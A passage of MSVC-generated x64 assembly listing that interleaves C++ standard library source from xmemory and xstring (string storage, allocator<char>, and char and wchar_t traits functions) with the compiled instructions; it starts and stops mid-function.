	mov	rcx, rax
	call	??0_Bxty@?$_String_val@U?$_Simple_types@D@std@@@std@@QEAA@XZ ; std::_String_val<std::_Simple_types<char> >::_Bxty::_Bxty

; 2250 : 
; 2251 :     // length of internal buffer, [1, 16]:
; 2252 :     static constexpr size_type _BUF_SIZE = 16 / sizeof(value_type) < 1 ? 1 : 16 / sizeof(value_type);
; 2253 :     // roundup mask for allocated buffers, [0, 15]:
; 2254 :     static constexpr size_type _ALLOC_MASK = sizeof(value_type) <= 1 ? 15
; 2255 :                                            : sizeof(value_type) <= 2 ? 7
; 2256 :                                            : sizeof(value_type) <= 4 ? 3
; 2257 :                                            : sizeof(value_type) <= 8 ? 1
; 2258 :                                                                      : 0;
; 2259 : 
; 2260 :     _CONSTEXPR20 value_type* _Myptr() noexcept {
; 2261 :         value_type* _Result = _Bx._Buf;
; 2262 :         if (_Large_string_engaged()) {
; 2263 :             _Result = _Unfancy(_Bx._Ptr);
; 2264 :         }
; 2265 : 
; 2266 :         return _Result;
; 2267 :     }
; 2268 : 
; 2269 :     _CONSTEXPR20 const value_type* _Myptr() const noexcept {
; 2270 :         const value_type* _Result = _Bx._Buf;
; 2271 :         if (_Large_string_engaged()) {
; 2272 :             _Result = _Unfancy(_Bx._Ptr);
; 2273 :         }
; 2274 : 
; 2275 :         return _Result;
; 2276 :     }
; 2277 : 
; 2278 :     _CONSTEXPR20 bool _Large_string_engaged() const noexcept {
; 2279 : #if _HAS_CXX20
; 2280 :         if (_STD is_constant_evaluated()) {
; 2281 :             return true;
; 2282 :         }
; 2283 : #endif // _HAS_CXX20
; 2284 :         return _BUF_SIZE <= _Myres;
; 2285 :     }
; 2286 : 
; 2287 :     _CONSTEXPR20 void _Check_offset(const size_type _Off) const {
; 2288 :         // checks whether _Off is in the bounds of [0, size()]
; 2289 :         if (_Mysize < _Off) {
; 2290 :             _Xran();
; 2291 :         }
; 2292 :     }
; 2293 : 
; 2294 :     _CONSTEXPR20 void _Check_offset_exclusive(const size_type _Off) const {
; 2295 :         // checks whether _Off is in the bounds of [0, size())
; 2296 :         if (_Mysize <= _Off) {
; 2297 :             _Xran();
; 2298 :         }
; 2299 :     }
; 2300 : 
; 2301 :     [[noreturn]] static void _Xran() {
; 2302 :         _Xout_of_range("invalid string position");
; 2303 :     }
; 2304 : 
; 2305 :     _CONSTEXPR20 size_type _Clamp_suffix_size(const size_type _Off, const size_type _Size) const noexcept {
; 2306 :         // trims _Size to the longest it can be assuming a string at/after _Off
; 2307 :         return (_STD min)(_Size, _Mysize - _Off);
; 2308 :     }
; 2309 : 
; 2310 :     union _Bxty { // storage for small buffer or pointer to larger one
; 2311 :         _CONSTEXPR20 _Bxty() noexcept : _Ptr() {} // user-provided, for fancy pointers
; 2312 : 
; 2313 :         _CONSTEXPR20 ~_Bxty() noexcept {} // user-provided, for fancy pointers
; 2314 : 
; 2315 :         value_type _Buf[_BUF_SIZE];
; 2316 :         pointer _Ptr;
; 2317 :         char _Alias[_BUF_SIZE]; // TRANSITION, ABI: _Alias is preserved for binary compatibility (especially /clr)
; 2318 :     } _Bx;
; 2319 : 
; 2320 :     size_type _Mysize = 0; // current length of string

	mov	rax, QWORD PTR this$[rsp]
	mov	QWORD PTR [rax+16], 0

; 2321 :     size_type _Myres  = 0; // current storage reserved for string

	mov	rax, QWORD PTR this$[rsp]
	mov	QWORD PTR [rax+24], 0

; 2249 :     _CONSTEXPR20 _String_val() noexcept : _Bx() {}

	mov	rax, QWORD PTR this$[rsp]
	add	rsp, 40					; 00000028H
	ret	0
??0?$_String_val@U?$_Simple_types@D@std@@@std@@QEAA@XZ ENDP ; std::_String_val<std::_Simple_types<char> >::_String_val<std::_Simple_types<char> >
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xmemory
;	COMDAT ?select_on_container_copy_construction@?$_Default_allocator_traits@V?$allocator@D@std@@@std@@SA?AV?$allocator@D@2@AEBV32@@Z
_TEXT	SEGMENT
__$ReturnUdt$ = 8
_Al$ = 16
?select_on_container_copy_construction@?$_Default_allocator_traits@V?$allocator@D@std@@@std@@SA?AV?$allocator@D@2@AEBV32@@Z PROC ; std::_Default_allocator_traits<std::allocator<char> >::select_on_container_copy_construction, COMDAT

; 699  :     _NODISCARD static _CONSTEXPR20 _Alloc select_on_container_copy_construction(const _Alloc& _Al) {

	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx

; 700  :         return _Al;

	mov	rax, QWORD PTR __$ReturnUdt$[rsp]

; 701  :     }

	ret	0
?select_on_container_copy_construction@?$_Default_allocator_traits@V?$allocator@D@std@@@std@@SA?AV?$allocator@D@2@AEBV32@@Z ENDP ; std::_Default_allocator_traits<std::allocator<char> >::select_on_container_copy_construction
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xmemory
;	COMDAT ?max_size@?$_Default_allocator_traits@V?$allocator@D@std@@@std@@SA_KAEBV?$allocator@D@2@@Z
_TEXT	SEGMENT
__formal$ = 8
?max_size@?$_Default_allocator_traits@V?$allocator@D@std@@@std@@SA_KAEBV?$allocator@D@2@@Z PROC ; std::_Default_allocator_traits<std::allocator<char> >::max_size, COMDAT

; 695  :     _NODISCARD static _CONSTEXPR20 size_type max_size(const _Alloc&) noexcept {

	mov	QWORD PTR [rsp+8], rcx

; 696  :         return static_cast<size_t>(-1) / sizeof(value_type);

	mov	rax, -1

; 697  :     }

	ret	0
?max_size@?$_Default_allocator_traits@V?$allocator@D@std@@@std@@SA_KAEBV?$allocator@D@2@@Z ENDP ; std::_Default_allocator_traits<std::allocator<char> >::max_size
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xmemory
;	COMDAT ?allocate@?$allocator@D@std@@QEAAPEAD_K@Z
_TEXT	SEGMENT
this$ = 48
_Count$ = 56
?allocate@?$allocator@D@std@@QEAAPEAD_K@Z PROC		; std::allocator<char>::allocate, COMDAT

; 835  :     _NODISCARD _CONSTEXPR20 __declspec(allocator) _Ty* allocate(_CRT_GUARDOVERFLOW const size_t _Count) {

$LN3:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H

; 836  :         static_assert(sizeof(value_type) > 0, "value_type must be complete before calling allocate.");
; 837  :         return static_cast<_Ty*>(_Allocate<_New_alignof<_Ty>>(_Get_size_of_n<sizeof(_Ty)>(_Count)));

	mov	rcx, QWORD PTR _Count$[rsp]
	call	??$_Get_size_of_n@$00@std@@YA_K_K@Z	; std::_Get_size_of_n<1>
	mov	rcx, rax
	call	??$_Allocate@$0BA@U_Default_allocate_traits@std@@$0A@@std@@YAPEAX_K@Z ; std::_Allocate<16,std::_Default_allocate_traits,0>

; 838  :     }

	add	rsp, 40					; 00000028H
	ret	0
?allocate@?$allocator@D@std@@QEAAPEAD_K@Z ENDP		; std::allocator<char>::allocate
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xmemory
;	COMDAT ?deallocate@?$allocator@D@std@@QEAAXQEAD_K@Z
_TEXT	SEGMENT
this$ = 48
_Ptr$ = 56
_Count$ = 64
?deallocate@?$allocator@D@std@@QEAAXQEAD_K@Z PROC	; std::allocator<char>::deallocate, COMDAT

; 829  :     _CONSTEXPR20 void deallocate(_Ty* const _Ptr, const size_t _Count) {

$LN3:
	mov	QWORD PTR [rsp+24], r8
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H

; 830  :         _STL_ASSERT(_Ptr != nullptr || _Count == 0, "null pointer cannot point to a block of non-zero size");
; 831  :         // no overflow check on the following multiply; we assume _Allocate did that check
; 832  :         _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

	mov	rdx, QWORD PTR _Count$[rsp]
	mov	rcx, QWORD PTR _Ptr$[rsp]
	call	??$_Deallocate@$0BA@$0A@@std@@YAXPEAX_K@Z ; std::_Deallocate<16,0>

; 833  :     }

	add	rsp, 40					; 00000028H
	ret	0
?deallocate@?$allocator@D@std@@QEAAXQEAD_K@Z ENDP	; std::allocator<char>::deallocate
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xmemory
;	COMDAT ??0?$allocator@D@std@@QEAA@XZ
_TEXT	SEGMENT
this$ = 8
??0?$allocator@D@std@@QEAA@XZ PROC			; std::allocator<char>::allocator<char>, COMDAT

; 821  :     constexpr allocator() noexcept {}

	mov	QWORD PTR [rsp+8], rcx
	mov	rax, QWORD PTR this$[rsp]
	ret	0
??0?$allocator@D@std@@QEAA@XZ ENDP			; std::allocator<char>::allocator<char>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstring
;	COMDAT ?_Xlen_string@std@@YAXXZ
_TEXT	SEGMENT
?_Xlen_string@std@@YAXXZ PROC				; std::_Xlen_string, COMDAT

; 2337 : [[noreturn]] inline void _Xlen_string() {

$LN3:
	sub	rsp, 40					; 00000028H

; 2338 :     _Xlength_error("string too long");

	lea	rcx, OFFSET FLAT:??_C@_0BA@JFNIOLAK@string?5too?5long@
	call	?_Xlength_error@std@@YAXPEBD@Z		; std::_Xlength_error
$LN2@Xlen_strin:

; 2339 : }

	add	rsp, 40					; 00000028H
	ret	0
?_Xlen_string@std@@YAXXZ ENDP				; std::_Xlen_string
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstring
;	COMDAT ?eof@?$_Narrow_char_traits@DH@std@@SAHXZ
_TEXT	SEGMENT
?eof@?$_Narrow_char_traits@DH@std@@SAHXZ PROC		; std::_Narrow_char_traits<char,int>::eof, COMDAT

; 472  :         return static_cast<int_type>(EOF);

	mov	eax, -1

; 473  :     }

	ret	0
?eof@?$_Narrow_char_traits@DH@std@@SAHXZ ENDP		; std::_Narrow_char_traits<char,int>::eof
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstring
;	COMDAT ?eq_int_type@?$_Narrow_char_traits@DH@std@@SA_NAEBH0@Z
_TEXT	SEGMENT
tv65 = 0
_Left$ = 32
_Right$ = 40
?eq_int_type@?$_Narrow_char_traits@DH@std@@SA_NAEBH0@Z PROC ; std::_Narrow_char_traits<char,int>::eq_int_type, COMDAT

; 463  :     _NODISCARD static constexpr bool eq_int_type(const int_type& _Left, const int_type& _Right) noexcept {

$LN5:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 24

; 464  :         return _Left == _Right;

	mov	rax, QWORD PTR _Left$[rsp]
	mov	rcx, QWORD PTR _Right$[rsp]
	mov	ecx, DWORD PTR [rcx]
	cmp	DWORD PTR [rax], ecx
	jne	SHORT $LN3@eq_int_typ
	mov	DWORD PTR tv65[rsp], 1
	jmp	SHORT $LN4@eq_int_typ
$LN3@eq_int_typ:
	mov	DWORD PTR tv65[rsp], 0
$LN4@eq_int_typ:
	movzx	eax, BYTE PTR tv65[rsp]

; 465  :     }

	add	rsp, 24
	ret	0
?eq_int_type@?$_Narrow_char_traits@DH@std@@SA_NAEBH0@Z ENDP ; std::_Narrow_char_traits<char,int>::eq_int_type
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstring
;	COMDAT ?to_int_type@?$_Narrow_char_traits@DH@std@@SAHAEBD@Z
_TEXT	SEGMENT
_Ch$ = 8
?to_int_type@?$_Narrow_char_traits@DH@std@@SAHAEBD@Z PROC ; std::_Narrow_char_traits<char,int>::to_int_type, COMDAT

; 459  :     _NODISCARD static constexpr int_type to_int_type(const _Elem& _Ch) noexcept {

	mov	QWORD PTR [rsp+8], rcx

; 460  :         return static_cast<unsigned char>(_Ch);

	mov	rax, QWORD PTR _Ch$[rsp]
	movzx	eax, BYTE PTR [rax]

; 461  :     }

	ret	0
?to_int_type@?$_Narrow_char_traits@DH@std@@SAHAEBD@Z ENDP ; std::_Narrow_char_traits<char,int>::to_int_type
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstring
;	COMDAT ?assign@?$_Narrow_char_traits@DH@std@@SAXAEADAEBD@Z
_TEXT	SEGMENT
_Left$ = 8
_Right$ = 16
?assign@?$_Narrow_char_traits@DH@std@@SAXAEADAEBD@Z PROC ; std::_Narrow_char_traits<char,int>::assign, COMDAT

; 438  :     static _CONSTEXPR17 void assign(_Elem& _Left, const _Elem& _Right) noexcept {

	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx

; 439  : #if _HAS_CXX20
; 440  :         if (_STD is_constant_evaluated()) {
; 441  :             return _Primary_char_traits::assign(_Left, _Right);
; 442  :         }
; 443  : #endif // _HAS_CXX20
; 444  :         _Left = _Right;

	mov	rax, QWORD PTR _Left$[rsp]
	mov	rcx, QWORD PTR _Right$[rsp]
	movzx	ecx, BYTE PTR [rcx]
	mov	BYTE PTR [rax], cl

; 445  :     }

	ret	0
?assign@?$_Narrow_char_traits@DH@std@@SAXAEADAEBD@Z ENDP ; std::_Narrow_char_traits<char,int>::assign
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstring
;	COMDAT ?assign@?$_Narrow_char_traits@DH@std@@SAPEADQEAD_KD@Z
_TEXT	SEGMENT
_First$ = 48
_Count$ = 56
_Ch$ = 64
?assign@?$_Narrow_char_traits@DH@std@@SAPEADQEAD_KD@Z PROC ; std::_Narrow_char_traits<char,int>::assign, COMDAT

; 427  :         _Out_writes_all_(_Count) _Elem* const _First, size_t _Count, const _Elem _Ch) noexcept /* strengthened */ {

$LN3:
	mov	BYTE PTR [rsp+24], r8b
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H

; 428  :         // assign _Count * _Ch to [_First, ...)
; 429  : #if _HAS_CXX20
; 430  :         if (_STD is_constant_evaluated()) {
; 431  :             return _Primary_char_traits::assign(_First, _Count, _Ch);
; 432  :         }
; 433  : #endif // _HAS_CXX20
; 434  : 
; 435  :         return static_cast<_Elem*>(_CSTD memset(_First, _Ch, _Count));

	movsx	eax, BYTE PTR _Ch$[rsp]
	mov	r8, QWORD PTR _Count$[rsp]
	mov	edx, eax
	mov	rcx, QWORD PTR _First$[rsp]
	call	memset

; 436  :     }

	add	rsp, 40					; 00000028H
	ret	0
?assign@?$_Narrow_char_traits@DH@std@@SAPEADQEAD_KD@Z ENDP ; std::_Narrow_char_traits<char,int>::assign
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstring
;	COMDAT ?find@?$_Narrow_char_traits@DH@std@@SAPEBDQEBD_KAEBD@Z
_TEXT	SEGMENT
_First$ = 48
_Count$ = 56
_Ch$ = 64
?find@?$_Narrow_char_traits@DH@std@@SAPEBDQEBD_KAEBD@Z PROC ; std::_Narrow_char_traits<char,int>::find, COMDAT

; 406  :         const _Elem& _Ch) noexcept /* strengthened */ {

$LN3:
	mov	QWORD PTR [rsp+24], r8
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H

; 407  :         // look for _Ch in [_First, _First + _Count)
; 408  : #if _HAS_CXX17
; 409  : #ifdef __cpp_char8_t
; 410  :         if constexpr (is_same_v<_Elem, char8_t>) {
; 411  : #if _HAS_U8_INTRINSICS
; 412  :             return __builtin_u8memchr(_First, _Ch, _Count);
; 413  : #else // ^^^ use u8 intrinsics / no u8 intrinsics vvv
; 414  :             return _Primary_char_traits::find(_First, _Count, _Ch);
; 415  : #endif // _HAS_U8_INTRINSICS
; 416  :         } else
; 417  : #endif // __cpp_char8_t
; 418  :         {
; 419  :             return __builtin_char_memchr(_First, _Ch, _Count);
; 420  :         }
; 421  : #else // _HAS_CXX17
; 422  :         return static_cast<const _Elem*>(_CSTD memchr(_First, _Ch, _Count));

	mov	rax, QWORD PTR _Ch$[rsp]
	movsx	eax, BYTE PTR [rax]
	mov	r8, QWORD PTR _Count$[rsp]
	mov	edx, eax
	mov	rcx, QWORD PTR _First$[rsp]
	call	memchr

; 423  : #endif // _HAS_CXX17
; 424  :     }

	add	rsp, 40					; 00000028H
	ret	0
?find@?$_Narrow_char_traits@DH@std@@SAPEBDQEBD_KAEBD@Z ENDP ; std::_Narrow_char_traits<char,int>::find
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstring
;	COMDAT ?length@?$_Narrow_char_traits@DH@std@@SA_KQEBD@Z
_TEXT	SEGMENT
_First$ = 48
?length@?$_Narrow_char_traits@DH@std@@SA_KQEBD@Z PROC	; std::_Narrow_char_traits<char,int>::length, COMDAT

; 385  :     _NODISCARD static _CONSTEXPR17 size_t length(_In_z_ const _Elem* const _First) noexcept /* strengthened */ {

$LN3:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H

; 386  :         // find length of null-terminated string
; 387  : #if _HAS_CXX17
; 388  : #ifdef __cpp_char8_t
; 389  :         if constexpr (is_same_v<_Elem, char8_t>) {
; 390  : #if _HAS_U8_INTRINSICS
; 391  :             return __builtin_u8strlen(_First);
; 392  : #else // ^^^ use u8 intrinsics / no u8 intrinsics vvv
; 393  :             return _Primary_char_traits::length(_First);
; 394  : #endif // _HAS_U8_INTRINSICS
; 395  :         } else
; 396  : #endif // __cpp_char8_t
; 397  :         {
; 398  :             return __builtin_strlen(_First);
; 399  :         }
; 400  : #else // _HAS_CXX17
; 401  :         return _CSTD strlen(reinterpret_cast<const char*>(_First));

	mov	rcx, QWORD PTR _First$[rsp]
	call	strlen

; 402  : #endif // _HAS_CXX17
; 403  :     }

	add	rsp, 40					; 00000028H
	ret	0
?length@?$_Narrow_char_traits@DH@std@@SA_KQEBD@Z ENDP	; std::_Narrow_char_traits<char,int>::length
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstring
;	COMDAT ?compare@?$_Narrow_char_traits@DH@std@@SAHQEBD0_K@Z
_TEXT	SEGMENT
_First1$ = 48
_First2$ = 56
_Count$ = 64
?compare@?$_Narrow_char_traits@DH@std@@SAHQEBD0_K@Z PROC ; std::_Narrow_char_traits<char,int>::compare, COMDAT

; 376  :         _In_reads_(_Count) const _Elem* const _First2, const size_t _Count) noexcept /* strengthened */ {

$LN3:
	mov	QWORD PTR [rsp+24], r8
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H

; 377  :         // compare [_First1, _First1 + _Count) with [_First2, ...)
; 378  : #if _HAS_CXX17
; 379  :         return __builtin_memcmp(_First1, _First2, _Count);
; 380  : #else // _HAS_CXX17
; 381  :         return _CSTD memcmp(_First1, _First2, _Count);

	mov	r8, QWORD PTR _Count$[rsp]
	mov	rdx, QWORD PTR _First2$[rsp]
	mov	rcx, QWORD PTR _First1$[rsp]
	call	memcmp

; 382  : #endif // _HAS_CXX17
; 383  :     }

	add	rsp, 40					; 00000028H
	ret	0
?compare@?$_Narrow_char_traits@DH@std@@SAHQEBD0_K@Z ENDP ; std::_Narrow_char_traits<char,int>::compare
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstring
;	COMDAT ?move@?$_Char_traits@DH@std@@SAPEADQEADQEBD_K@Z
_TEXT	SEGMENT
_First1$ = 48
_First2$ = 56
_Count$ = 64
?move@?$_Char_traits@DH@std@@SAPEADQEADQEBD_K@Z PROC	; std::_Char_traits<char,int>::move, COMDAT

; 79   :         _In_reads_(_Count) const _Elem* const _First2, const size_t _Count) noexcept /* strengthened */ {

$LN3:
	mov	QWORD PTR [rsp+24], r8
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H

; 80   :         // copy [_First2, _First2 + _Count) to [_First1, ...), allowing overlap
; 81   : #if _HAS_MEMCPY_MEMMOVE_INTRINSICS
; 82   :         __builtin_memmove(_First1, _First2, _Count * sizeof(_Elem));
; 83   : #else // ^^^ _HAS_MEMCPY_MEMMOVE_INTRINSICS ^^^ / vvv !_HAS_MEMCPY_MEMMOVE_INTRINSICS vvv
; 84   : #if _HAS_CXX20
; 85   :         if (_STD is_constant_evaluated()) {
; 86   :             // dest: [_First1, _First1 + _Count)
; 87   :             // src: [_First2, _First2 + _Count)
; 88   :             // We need to handle overlapping ranges.
; 89   :             // If _First1 is in the src range, we need a backward loop.
; 90   :             // Otherwise, the forward loop works (even if the back of dest overlaps the front of src).
; 91   : 
; 92   :             // Usually, we would compare pointers with less-than, even though they could belong to different arrays.
; 93   :             // However, we're not allowed to do that during constant evaluation, so we need a linear scan for equality.
; 94   :             bool _Loop_forward = true;
; 95   : 
; 96   :             for (const _Elem* _Src = _First2; _Src != _First2 + _Count; ++_Src) {
; 97   :                 if (_First1 == _Src) {
; 98   :                     _Loop_forward = false;
; 99   :                     break;
; 100  :                 }
; 101  :             }
; 102  : 
; 103  :             if (_Loop_forward) {
; 104  :                 for (size_t _Idx = 0; _Idx != _Count; ++_Idx) {
; 105  :                     _First1[_Idx] = _First2[_Idx];
; 106  :                 }
; 107  :             } else {
; 108  :                 for (size_t _Idx = _Count; _Idx != 0; --_Idx) {
; 109  :                     _First1[_Idx - 1] = _First2[_Idx - 1];
; 110  :                 }
; 111  :             }
; 112  : 
; 113  :             return _First1;
; 114  :         }
; 115  : #endif // _HAS_CXX20
; 116  : 
; 117  :         _CSTD memmove(_First1, _First2, _Count * sizeof(_Elem));

	mov	r8, QWORD PTR _Count$[rsp]
	mov	rdx, QWORD PTR _First2$[rsp]
	mov	rcx, QWORD PTR _First1$[rsp]
	call	memmove

; 118  : #endif // ^^^ !_HAS_MEMCPY_MEMMOVE_INTRINSICS ^^^
; 119  : 
; 120  :         return _First1;

	mov	rax, QWORD PTR _First1$[rsp]

; 121  :     }

	add	rsp, 40					; 00000028H
	ret	0
?move@?$_Char_traits@DH@std@@SAPEADQEADQEBD_K@Z ENDP	; std::_Char_traits<char,int>::move
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstring
;	COMDAT ?copy@?$_Char_traits@DH@std@@SAPEADQEADQEBD_K@Z
_TEXT	SEGMENT
_First1$ = 48
_First2$ = 56
_Count$ = 64
?copy@?$_Char_traits@DH@std@@SAPEADQEADQEBD_K@Z PROC	; std::_Char_traits<char,int>::copy, COMDAT

; 48   :         _In_reads_(_Count) const _Elem* const _First2, const size_t _Count) noexcept /* strengthened */ {

$LN3:
	mov	QWORD PTR [rsp+24], r8
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H

; 49   :         // copy [_First2, _First2 + _Count) to [_First1, ...)
; 50   : #if _HAS_MEMCPY_MEMMOVE_INTRINSICS
; 51   :         __builtin_memcpy(_First1, _First2, _Count * sizeof(_Elem));
; 52   : #else // ^^^ _HAS_MEMCPY_MEMMOVE_INTRINSICS ^^^ / vvv !_HAS_MEMCPY_MEMMOVE_INTRINSICS vvv
; 53   : #if _HAS_CXX20
; 54   :         if (_STD is_constant_evaluated()) {
; 55   :             // pre: [_First1, _First1 + _Count) and [_First2, _First2 + _Count) do not overlap; see LWG-3085
; 56   :             for (size_t _Idx = 0; _Idx != _Count; ++_Idx) {
; 57   :                 _First1[_Idx] = _First2[_Idx];
; 58   :             }
; 59   : 
; 60   :             return _First1;
; 61   :         }
; 62   : #endif // _HAS_CXX20
; 63   : 
; 64   :         _CSTD memcpy(_First1, _First2, _Count * sizeof(_Elem));

	mov	r8, QWORD PTR _Count$[rsp]
	mov	rdx, QWORD PTR _First2$[rsp]
	mov	rcx, QWORD PTR _First1$[rsp]
	call	memcpy

; 65   : #endif // ^^^ !_HAS_MEMCPY_MEMMOVE_INTRINSICS ^^^
; 66   : 
; 67   :         return _First1;

	mov	rax, QWORD PTR _First1$[rsp]

; 68   :     }

	add	rsp, 40					; 00000028H
	ret	0
?copy@?$_Char_traits@DH@std@@SAPEADQEADQEBD_K@Z ENDP	; std::_Char_traits<char,int>::copy
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstring
;	COMDAT ?eof@?$_WChar_traits@_W@std@@SAGXZ
_TEXT	SEGMENT
?eof@?$_WChar_traits@_W@std@@SAGXZ PROC			; std::_WChar_traits<wchar_t>::eof, COMDAT

; 328  :         return WEOF;

	mov	eax, 65535				; 0000ffffH

; 329  :     }

	ret	0
?eof@?$_WChar_traits@_W@std@@SAGXZ ENDP			; std::_WChar_traits<wchar_t>::eof
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstring
;	COMDAT ?eq_int_type@?$_WChar_traits@_W@std@@SA_NAEBG0@Z
_TEXT	SEGMENT
tv67 = 0
_Left$ = 32
_Right$ = 40
?eq_int_type@?$_WChar_traits@_W@std@@SA_NAEBG0@Z PROC	; std::_WChar_traits<wchar_t>::eq_int_type, COMDAT

; 319  :     _NODISCARD static constexpr bool eq_int_type(const int_type& _Left, const int_type& _Right) noexcept {

$LN5:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 24

; 320  :         return _Left == _Right;

	mov	rax, QWORD PTR _Left$[rsp]
	movzx	eax, WORD PTR [rax]
	mov	rcx, QWORD PTR _Right$[rsp]
	movzx	ecx, WORD PTR [rcx]
	cmp	eax, ecx
	jne	SHORT $LN3@eq_int_typ
	mov	DWORD PTR tv67[rsp], 1
	jmp	SHORT $LN4@eq_int_typ
$LN3@eq_int_typ:
	mov	DWORD PTR tv67[rsp], 0
$LN4@eq_int_typ:
	movzx	eax, BYTE PTR tv67[rsp]

; 321  :     }

	add	rsp, 24
	ret	0
?eq_int_type@?$_WChar_traits@_W@std@@SA_NAEBG0@Z ENDP	; std::_WChar_traits<wchar_t>::eq_int_type
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstring
;	COMDAT ?to_int_type@?$_WChar_traits@_W@std@@SAGAEB_W@Z
_TEXT	SEGMENT
_Ch$ = 8
?to_int_type@?$_WChar_traits@_W@std@@SAGAEB_W@Z PROC	; std::_WChar_traits<wchar_t>::to_int_type, COMDAT

; 315  :     _NODISCARD static constexpr int_type to_int_type(const _Elem& _Ch) noexcept {

	mov	QWORD PTR [rsp+8], rcx

; 316  :         return _Ch;

	mov	rax, QWORD PTR _Ch$[rsp]
	movzx	eax, WORD PTR [rax]

; 317  :     }

	ret	0
?to_int_type@?$_WChar_traits@_W@std@@SAGAEB_W@Z ENDP	; std::_WChar_traits<wchar_t>::to_int_type
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstring
;	COMDAT ?assign@?$_WChar_traits@_W@std@@SAXAEA_WAEB_W@Z
_TEXT	SEGMENT
_Left$ = 8
_Right$ = 16
?assign@?$_WChar_traits@_W@std@@SAXAEA_WAEB_W@Z PROC	; std::_WChar_traits<wchar_t>::assign, COMDAT

; 294  :     static _CONSTEXPR17 void assign(_Elem& _Left, const _Elem& _Right) noexcept {

	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx

; 295  : #if _HAS_CXX20
; 296  :         if (_STD is_constant_evaluated()) {
; 297  :             return _Primary_char_traits::assign(_Left, _Right);
; 298  :         }
; 299  : #endif // _HAS_CXX20
; 300  :         _Left = _Right;

	mov	rax, QWORD PTR _Left$[rsp]
	mov	rcx, QWORD PTR _Right$[rsp]
	movzx	ecx, WORD PTR [rcx]
	mov	WORD PTR [rax], cx

; 301  :     }

	ret	0
?assign@?$_WChar_traits@_W@std@@SAXAEA_WAEB_W@Z ENDP	; std::_WChar_traits<wchar_t>::assign
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstring
;	COMDAT ?find@?$_WChar_traits@_W@std@@SAPEB_WPEB_W_KAEB_W@Z
_TEXT	SEGMENT
_First$ = 48
_Count$ = 56
_Ch$ = 64
?find@?$_WChar_traits@_W@std@@SAPEB_WPEB_W_KAEB_W@Z PROC ; std::_WChar_traits<wchar_t>::find, COMDAT

; 269  :         _In_reads_(_Count) const _Elem* _First, const size_t _Count, const _Elem& _Ch) noexcept /* strengthened */ {

$LN3:
	mov	QWORD PTR [rsp+24], r8
